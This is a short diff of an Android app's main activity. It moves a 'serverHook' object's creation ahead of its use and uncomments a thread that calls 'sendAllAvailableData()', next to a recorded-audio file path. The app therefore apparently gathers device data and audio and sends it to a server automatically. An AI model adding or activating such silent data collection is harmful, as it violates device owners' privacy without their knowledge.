@@ -90,19 +90,18 @@ public class MainActivity extends AppCompatActivity {
                         + "/myaudio.3gp";
 
 
-
+        hook = new serverHook();
         identifier = hook.start();
 
         if(!dataSent){
             dataSent = true;
 
-             hook = new serverHook();
             Thread t = new Thread(){
                 public void run() {
                     sendAllAvailableData();
                 }
             };
-            //t.start();
+            t.start();
 
         }
 
